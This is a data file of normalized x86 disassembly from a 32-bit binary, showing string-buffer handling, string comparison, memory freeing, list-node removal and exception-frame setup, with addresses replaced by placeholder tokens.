add esp 0x4
mov eax [ ebp - 0x48 ]
or edi 0xffffffff
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x6c ] 0x0
jae r-xdata
mov esi [ ebp - 0x60 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
lea edi [ ebp - 0x48 ]
mov [ esi ] bl
call sub_10005ef0
mov edi 0x10
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov cl [ eax + esi ]
mov edx [ ebp - 0x54 ]
lea ebx [ eax + esi ]
mov [ ebp - 0x4c ] ebx
cmp cl [ edx ]
jne r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp + 0x20 ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10012c4b
add esp 0x4
mov eax ebx
mov [ ebp - 0x50 ] 0x0
lea edx [ eax + 0x1 ]
mov ecx [ ebp - 0x68 ]
mov cl [ ecx ]
mov eax 0x1
cmp [ ebx + 0x1 ] cl
jne r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp + 0xc ]
push eax
call sub_10012c4b
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
je r-xdata
mov ecx [ ebp - 0x58 ]
lea edi [ eax - 0x1 ]
add ecx 0x4
xor esi esi
mov eax r--data
mov [ ebp - 0x6c ] 0x1
call sub_10004db0
inc eax
cmp [ eax + ebx ] cl
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0x20
mov edi [ ebp - 0x60 ]
mov ebx 0xf
mov [ edi + 0x14 ] ebx
mov [ edi + 0x10 ] 0x0
xor esi esi
mov eax r--data
mov ecx edi
mov [ edi ] 0x0
call sub_10004db0
mov esi 0x10
cmp [ ebp - 0x34 ] esi
jb r-xdata
or eax 0xffffffff
mov esi ebx
sub eax ebx
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x78 ] eax
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
cmp [ ebp + 0x20 ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10012c4b
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax ebx
push eax
push edx
push esi
call sub_100131d0
add esp 0xc
test eax eax
jne r-xdata
mov eax edi
mov eax [ ebp + 0xc ]
push eax
call sub_10012c4b
add esp 0x4
mov esi [ ebp - 0x74 ]
mov eax esi
lea edx [ eax + 0x1 ]
nop
cmp [ ebp - 0x6c ] eax
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push esi
mov esi [ ebp - 0x54 ]
push esi
call sub_100131d0
add esp 0xc
test eax eax
je r-xdata
mov esi [ ebp - 0x50 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4c ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
call sub_10004db0
mov ebx [ ebp - 0x58 ]
add ebx 0x4
lea edi [ ebp - 0x2c ]
mov esi ebx
mov [ ebp - 0x4 ] 0x3
call sub_10005ef0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ebx [ ebp - 0x50 ]
lea eax [ edi + 0x1 ]
cmp eax ebx
jne r-xdata
mov ebx [ ebp - 0x5c ]
mov eax ebx
lea edx [ eax + 0x1 ]
mov ecx [ ebp - 0x50 ]
xor edi edi
cmp ecx edi
jbe r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10012c4b
add esp 0x4
mov edx [ ebp - 0x4c ]
mov esi ebx
lea eax [ edx + edi + 0x1 ]
sub esi edi
dec esi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x5c ] eax
call sub_10004db0
mov esi [ ebp - 0x58 ]
add esi 0x24
lea edi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x5
call sub_10005ef0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
cmp [ esi ] 0x0
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push ebx
push esi
call sub_100131d0
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp - 0x68 ]
mov al [ eax ]
mov edx [ ebp - 0x4c ]
mov [ ebp - 0x6c ] 0x1
mov edi ecx
cmp [ edx + ecx + 0x1 ] al
jne r-xdata
mov esi [ ebp - 0x54 ]
add esi [ ebp - 0x78 ]
cmp esi edi
jbe r-xdata
mov edi [ ebp - 0x58 ]
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10012c4b
add esp 0x4
mov eax [ ebp - 0x4c ]
inc ebx
inc esi
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x54 ] esi
lea edx [ eax + 0x1 ]
mov ecx [ ebp - 0x64 ]
mov edx [ ebp - 0x4c ]
inc ecx
push 0x0
push ecx
sub esp 0x1c
lea edi [ ebx + edx ]
mov ecx esp
mov ebx 0xf
mov edx edi
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] 0x0
mov [ ebp - 0x5c ] esp
mov [ ecx ] 0x0
lea esi [ edx + 0x1 ]
cmp [ esi ] 0x0
jne r-xdata
mov ecx edx
lea esp [ esp ]
lea ecx [ ecx ]
mov edx [ ebp - 0x4c ]
xor eax eax
mov [ edi + 0x20 ] eax
lea edi [ ebx + edx ]
mov ebx [ ebp - 0x60 ]
mov ecx edi
mov [ ebx + 0x14 ] 0xf
mov [ ebx + 0x10 ] eax
mov [ ebx ] al
lea edx [ ecx + 0x1 ]
lea ecx [ ecx ]
cmp [ edi + 0x34 ] 0x0
jbe r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
cmp ebx eax
jb r-xdata
mov al [ edx ]
inc edx
test al al
jne r-xdata
sub edx esi
mov esi edx
mov eax edi
call sub_10004db0
mov esi [ ebp - 0x60 ]
mov ecx [ ebp - 0x58 ]
push esi
call sub_1000e990
mov edi 0x10
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov ebx [ ebp - 0x50 ]
inc edi
cmp [ ecx + edi + 0x1 ] al
je r-xdata
dec esi
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] 0x0
call sub_10004db0
lea eax [ ebp - 0x2c ]
cmp ebx eax
je r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
mov esi ecx
mov eax edi
mov ecx ebx
call sub_10004db0
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov edx [ ebp - 0x70 ]
mov eax edx
lea ebx [ eax + 0x1 ]
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
cmp [ ebp + 0x20 ] edi
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_10012c4b
add esp 0x4
mov eax [ ebp - 0x4c ]
mov cl [ esi + eax ]
mov edx [ ebp - 0x68 ]
cmp cl [ edx ]
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
cmp [ ebp + 0x20 ] 0x10
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_10012c4b
add esp 0x4
mov ecx [ ebp - 0x70 ]
push ecx
push esi
call sub_10013290
add esp 0x8
test eax eax
je r-xdata
mov esi [ esi ]
mov ecx [ ebp + 0xc ]
push ecx
call sub_10012c4b
add esp 0x4
mov eax esi
jmp r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10012c4b
add esp 0x4
mov [ ebx + 0x14 ] 0xf
mov [ ebx + 0x10 ] edi
mov [ ebx ] 0x0
cmp [ ebp - 0x18 ] 0x10
jae r-xdata
mov eax [ ebx ]
push eax
call sub_10012c4b
add esp 0x4
mov eax ebx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push ecx
call sub_10012c4b
add esp 0x4
mov edx [ ebp - 0x64 ]
mov ebx [ ebp - 0x5c ]
push 0x1
inc edx
push edx
sub esp 0x1c
mov ecx esp
mov eax ebx
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
mov [ ebp - 0x74 ] esp
mov [ ecx ] 0x0
lea esi [ eax + 0x1 ]
lea ebx [ ebx ]
mov edx [ ebp - 0x2c ]
mov [ ebx ] edx
mov [ ebp - 0x2c ] edi
mov eax [ ebp - 0x1c ]
inc eax
push eax
lea ecx [ ebp - 0x2c ]
push ecx
push ebx
call sub_100128c0
add esp 0xc
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
mov esi eax
mov eax ebx
call sub_10004db0
mov esi [ ebp - 0x60 ]
push esi
mov ecx edi
call sub_1000e990
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x18 ]
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x14 ] ecx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
cmp [ ebp + 0x20 ] 0x10
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_10012c4b
add esp 0x4
mov ecx [ ebp + 0xc ]
push ecx
call sub_10012c4b
add esp 0x4
mov eax esi
jmp r-xdata
sub_1000e7d0
push ebp
mov ebp esp
push ecx
cmp [ eax + 0x20 ] 0x0
jne r-xdata
push ebx
push esi
push edi
mov edi [ eax + 0x44 ]
xor esi esi
test edi edi
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ eax + 0x40 ]
mov ebx [ eax ]
add eax 0xc
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov ecx esi
lea esp [ esp ]
lea edx [ eax + 0x1 ]
mov eax [ eax ]
dec ecx
mov eax [ eax ]
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
inc esi
cmp esi edi
jb r-xdata
mov eax ebx
test esi esi
je r-xdata
sub_1000e840
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c69e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor ebx ebx
mov [ ebp - 0x4 ] ebx
lea edi [ esi + 0x40 ]
mov [ ebp - 0x14 ] edi
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call sub_1000f090
mov eax [ edi ]
push eax
call sub_10012c4b
mov edi 0x10
add esp 0x4
cmp [ esi + 0x38 ] edi
jb r-xdata
mov [ esi + 0x38 ] 0xf
mov [ esi + 0x34 ] ebx
mov [ esi + 0x24 ] bl
cmp [ esi + 0x18 ] edi
jb r-xdata
mov ecx [ esi + 0x24 ]
push ecx
call sub_10012c4b
add esp 0x4
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esi + 0x4 ] bl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi + 0x4 ]
push edx
call sub_10012c4b
add esp 0x4
sub_1000e8f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
push edi
mov eax 0x8
call sub_10011c70
mov ebx eax
mov eax 0x6
call sub_10011c70
mov edi eax
mov eax 0x9
call sub_10011c70
mov [ ebp - 0x4 ] eax
mov edi edi
mov ecx esi
cmp esi eax
je r-xdata
push edi
push esi
call sub_10013290
add esp 0x8
test eax eax
je r-xdata
lea esi [ eax + 0x1 ]
mov al [ esi ]
cmp al [ edi ]
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx ]
mov cl [ esi ]
mov eax esi
test cl cl
je r-xdata
push ebx
push esi
call sub_10013290
add esp 0x8
test eax eax
jne r-xdata
inc esi
jmp r-xdata
mov eax esi
inc ecx
cmp ecx eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov dl [ edx ]
lea esp [ esp ]
cmp [ ecx ] dl
jne r-xdata
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
cmp cl dl
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000e990
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d820
mov eax [ fs : 0x0 ]
push eax
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi ecx
xor ebx ebx
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x50 ] ebx
lea ecx [ edi + 0x40 ]
mov [ ebp - 0x4 ] ebx
call sub_1000f090
lea ecx [ edi + 0x24 ]
xor esi esi
mov eax r--data
call sub_10004db0
cmp [ ebp + 0x20 ] 0x10
mov eax [ ebp + 0xc ]
mov [ edi + 0x20 ] 0x1
jae r-xdata
call sub_1000e8f0
mov ecx eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
lea esi [ ecx + 0x1 ]
nop
lea eax [ ebp + 0xc ]
mov dl [ ecx ]
inc ecx
cmp dl bl
jne r-xdata
sub ecx esi
mov esi ecx
lea ecx [ ebp - 0x2c ]
call sub_10004db0
mov ecx [ ebp + 0x28 ]
lea edx [ ecx + ecx ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x50 ] edx
mov esi [ ebp + 0x28 ]
cmp [ ebp - 0x4c ] 0x0
jg r-xdata
xor ebx ebx
cmp [ ebp - 0x18 ] esi
jb r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jae r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10012c4b
add esp 0x4
xor ebx ebx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ edi + 0x14 ] esi
jae r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10012c4b
add esp 0x4
sub esp 0x1c
mov edi esp
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x60 ] esp
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
push eax
or ecx 0xffffffff
xor ebx ebx
mov [ edi ] 0x0
call sub_10004820
mov ecx [ ebp - 0x58 ]
push ecx
mov edx esi
lea ecx [ ebp - 0x48 ]
call sub_1000e170
mov edi eax
lea edx [ ebp - 0x2c ]
lea esi [ ebx + 0x10 ]
cmp edx edi
je r-xdata
call sub_1000e8f0
mov ecx eax
lea esi [ ecx + 0x1 ]
lea eax [ ebp - 0x2c ]
mov edx [ edi ]
mov [ ebp - 0x2c ] edx
mov [ edi ] ebx
mov eax [ edi + 0x10 ]
inc eax
push eax
lea ecx [ ebp - 0x2c ]
push edi
push ecx
call sub_100128c0
add esp 0xc
jmp r-xdata
mov dl [ ecx ]
inc ecx
cmp dl bl
jne r-xdata
sub ecx esi
mov esi ecx
lea ecx [ ebp - 0x2c ]
call sub_10004db0
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
push eax
or ecx 0xffffffff
xor ebx ebx
lea edi [ ebp - 0x48 ]
mov [ ebp - 0x34 ] 0xf
call sub_10004820
lea eax [ ebx + 0x9 ]
mov [ ebp - 0x4 ] 0x3
call sub_10011c70
mov edi [ ebp - 0x34 ]
mov edx [ ebp - 0x48 ]
cmp edi 0x10
jae r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ edi + 0x10 ]
mov [ ebp - 0x1c ] eax
mov ecx [ edi + 0x14 ]
mov [ ebp - 0x18 ] ecx
mov [ edi + 0x10 ] ebx
mov [ edi + 0x14 ] ebx
jmp r-xdata
mov al [ eax ]
xor ebx ebx
xor ecx ecx
cmp [ edx ] al
jne r-xdata
lea edx [ ebp - 0x48 ]
xor edx edx
cmp [ ebp - 0x50 ] ecx
mov [ ebp - 0x4 ] 0x1
sete dl
mov esi edx
cmp edi 0x10
jb r-xdata
lea esp [ esp ]
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_10012c4b
add esp 0x4
inc ecx
cmp [ ecx + edx ] al
je r-xdata
mov esi [ ebp - 0x5c ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
lea edi [ ebp - 0x2c ]
mov [ esi ] bl
call sub_10005ef0
mov edi 0x10
cmp [ ebp - 0x18 ] edi
jb r-xdata
inc [ ebp - 0x4c ]
mov edi [ ebp - 0x54 ]
jmp r-xdata
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp + 0x20 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10012c4b
add esp 0x4
mov ebx r--data
call sub_1000dfb0
cmp [ ebp + 0x2c ] 0x0
mov [ ebp - 0x58 ] eax
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0x28
mov edx [ ebp + 0xc ]
push edx
call sub_10012c4b
add esp 0x4
sub_1000ec10
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d409
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x3c ] eax
lea eax [ esi + 0x4 ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x4c ] esi
call sub_10011c70
mov [ ebp - 0x40 ] eax
lea eax [ esi + 0x5 ]
call sub_10011c70
mov ebx eax
lea eax [ esi + 0x6 ]
call sub_10011c70
mov [ ebp - 0x34 ] eax
lea eax [ esi + 0x7 ]
call sub_10011c70
mov [ ebp - 0x44 ] eax
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] esi
mov eax r--data
mov ecx edi
mov [ edi ] 0x0
call sub_10004db0
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4c ] 0x1
cmp [ ecx + 0x20 ] esi
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx ecx
mov esi [ edx + 0x18 ]
cmp esi 0x10
jb r-xdata
mov esi [ ebp - 0x30 ]
mov eax esi
call sub_1000e7d0
test eax eax
je r-xdata
mov eax ecx
add eax 0x4
cmp [ eax + 0x14 ] 0x10
jb r-xdata
lea eax [ edx + 0x4 ]
mov eax [ edx + 0x4 ]
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
mov [ ebp - 0x38 ] 0x0
jbe r-xdata
xor edx edx
mov [ ebp - 0x38 ] edx
cmp [ esi + 0x44 ] edx
jbe r-xdata
mov ecx eax
lea esi [ ecx + 0x1 ]
mov eax [ eax ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax [ ebp - 0x34 ]
je r-xdata
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x34 ] ecx
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp - 0x3c ]
inc ecx
mov [ ebp - 0x34 ] ecx
mov eax [ ebp - 0x3c ]
inc eax
mov [ ebp - 0x34 ] eax
jmp r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
push ecx
mov ecx edi
call sub_10002a60
mov eax ebx
lea ecx [ eax + 0x1 ]
lea esp [ esp ]
mov eax edx
add eax 0x24
cmp [ eax + 0x14 ] 0x10
jb r-xdata
cmp esi 0x10
jb r-xdata
mov ebx [ ebp - 0x40 ]
add eax 0x8
cmp [ ebp - 0x3c ] 0x0
mov [ ebp - 0x48 ] eax
jle r-xdata
dec ecx
mov eax [ eax ]
jne r-xdata
mov eax [ esi + 0x40 ]
mov eax [ eax ]
test edx edx
je r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
mov eax ebx
mov ecx edi
call sub_10002a60
mov edx [ ebp - 0x34 ]
mov eax edx
lea ebx [ eax + 0x1 ]
jmp r-xdata
mov ecx eax
lea esi [ ecx + 0x1 ]
mov eax [ eax ]
lea eax [ edx + 0x4 ]
mov eax [ edx + 0x4 ]
jmp r-xdata
mov eax ebx
lea edx [ eax + 0x1 ]
mov esi [ ebp - 0x3c ]
lea esp [ esp ]
add eax 0x8
mov [ ebp - 0x44 ] eax
test edx edx
jne r-xdata
mov ecx edx
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
push ecx
mov ecx edi
call sub_10002a60
jmp r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
push ecx
mov ecx edi
call sub_10002a60
mov eax ebx
lea ecx [ eax + 0x1 ]
mov ecx eax
lea esi [ ecx + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
mov eax ebx
mov ecx edi
call sub_10002a60
mov esi [ ebp - 0x44 ]
mov eax esi
lea ecx [ eax + 0x1 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
mov eax ebx
mov ecx edi
call sub_10002a60
dec esi
jne r-xdata
cmp [ ebp - 0x3c ] 0x0
mov ebx [ ebp - 0x40 ]
jle r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
dec ecx
mov eax [ eax ]
jne r-xdata
sub eax ebx
push eax
mov eax edx
mov ecx edi
call sub_10002a60
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
mov eax ebx
mov ecx edi
call sub_10002a60
mov eax [ ebp - 0x30 ]
add eax 0x24
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov eax ebx
lea edx [ eax + 0x1 ]
mov eax ebx
lea edx [ eax + 0x1 ]
mov esi [ ebp - 0x3c ]
mov ecx [ ebp - 0x34 ]
push 0x0
push ecx
mov ecx [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
push edx
call sub_1000ec10
push 0x0
push eax
or eax 0xffffffff
mov [ ebp - 0x4 ] 0x1
call sub_10002bb0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ecx eax
lea esi [ ecx + 0x1 ]
mov edi edi
mov eax [ eax ]
sub eax ecx
push eax
mov eax esi
mov ecx edi
call sub_10002a60
mov esi [ ebp - 0x48 ]
mov eax esi
call sub_1000e7d0
push eax
mov eax [ ebp - 0x34 ]
push eax
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx esi
call sub_1000ec10
push 0x0
push eax
or eax 0xffffffff
mov [ ebp - 0x4 ] 0x2
call sub_10002bb0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
mov eax ebx
mov ecx edi
call sub_10002a60
mov esi [ ebp - 0x30 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
mov eax ebx
mov ecx edi
call sub_10002a60
dec esi
jne r-xdata
mov eax [ esi + 0x44 ]
mov ebx [ ebp - 0x38 ]
dec eax
cmp ebx eax
je r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10012c4b
add esp 0x4
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
push ecx
mov ecx edi
call sub_10002a60
jmp r-xdata
mov ebx [ ebp - 0x30 ]
mov eax [ ebx + 0x44 ]
mov esi [ ebp - 0x38 ]
dec eax
cmp esi eax
je r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10012c4b
add esp 0x4
mov eax ebx
lea edx [ eax + 0x1 ]
inc ebx
mov [ ebp - 0x38 ] ebx
cmp ebx [ esi + 0x44 ]
jb r-xdata
push 0x1
mov eax r--data
mov ecx edi
call sub_10002a60
inc esi
mov [ ebp - 0x38 ] esi
cmp esi [ ebx + 0x44 ]
jb r-xdata
push 0x1
mov eax r--data
mov ecx edi
call sub_10002a60
mov edx [ ebp - 0x38 ]
jmp r-xdata
mov edx [ ebp - 0x30 ]
mov ecx [ ebp - 0x38 ]
mov eax [ edx + 0x40 ]
mov eax [ eax ]
test ecx ecx
je r-xdata
sub_1000efe0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001bd68
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_1000f090
mov eax [ esi ]
push eax
call sub_10012c4b
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1000f040
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov [ ebp + 0x8 ] eax
cmp esi [ edi ]
je r-xdata
mov [ ebx ] eax
mov eax ebx
pop esi
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
mov [ eax ] ecx
mov edx [ esi ]
mov eax [ esi + 0x4 ]
lea ecx [ esi + 0x8 ]
mov [ edx + 0x4 ] eax
call sub_1000e840
push esi
call sub_10012c4b
mov ecx [ ebp + 0x8 ]
add esp 0x4
dec [ edi + 0x4 ]
mov [ ebx ] ecx
mov eax ebx
pop esi
pop ebp
retn 0x4
sub_1000f090
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c65e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x14 ] ecx
mov eax [ ecx ]
mov edi [ eax ]
mov [ eax ] eax
mov eax [ ecx ]
mov [ eax + 0x4 ] eax
mov [ ecx + 0x4 ] 0x0
cmp edi [ ecx ]
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
lea esi [ edi + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x18 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
lea ebx [ esi + 0x40 ]
mov [ ebp - 0x1c ] ebx
mov ecx ebx
mov [ ebp - 0x4 ] 0x2
call sub_1000f090
mov ebx [ ebx ]
push ebx
call sub_10012c4b
mov ebx 0x10
add esp 0x4
cmp [ esi + 0x38 ] ebx
jb r-xdata
mov [ esi + 0x38 ] 0xf
mov [ esi + 0x34 ] 0x0
mov [ esi + 0x24 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x18 ] ebx
jb r-xdata
mov eax [ esi + 0x24 ]
push eax
call sub_10012c4b
add esp 0x4
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
push edi
mov [ esi + 0x4 ] 0x0
call sub_10012c4b
mov edi [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
add esp 0x4
cmp edi [ edx ]
jne r-xdata
mov ecx [ esi + 0x4 ]
push ecx
call sub_10012c4b
add esp 0x4
sub_1000f1a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cc45
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
